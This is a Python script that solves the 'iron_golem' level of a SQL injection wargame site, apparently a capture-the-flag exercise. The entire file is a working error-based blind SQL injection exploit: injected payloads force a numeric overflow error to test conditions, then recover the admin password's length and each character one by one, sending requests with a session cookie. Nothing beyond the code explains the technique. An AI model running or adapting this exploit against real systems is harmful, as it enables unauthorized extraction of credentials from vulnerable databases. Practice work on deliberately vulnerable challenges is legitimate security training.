import requests
import string


def find_password_length(n):
    payload = f"?pw='%20or%20id='admin'%20and%20if(length(pw)={n},1,power(10000000,1000000))%23"
    if 'DOUBLE value' not in send_request(payload):
        return n


def find_password(position, char):
    payload = f"?pw='%20or%20id='admin'%20and%20if(substring(pw,{position},1)='{char}',1,power(10000000,1000000))%23"
    if 'DOUBLE value' not in send_request(payload):
        return char


def send_request(payload):
    url = 'https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php'
    cookie = {'PHPSESSID': 'cs46vee23eb9l4maja3esa4ec1'}
    r = requests.get(url + payload, cookies=cookie)
    return r.text


if __name__ == "__main__":
    characters = string.printable
    pw = []

    for i in range(100):
        length = find_password_length(i)
        if length:
            print(f'pw length is {length}')
            break

    for i in range(1, length + 1):
        for char in characters:
            if find_password(str(i), char):
                pw.append(char)
                print(f'pw = {pw}')
                break

    print(f'pw={"".join(pw)}')
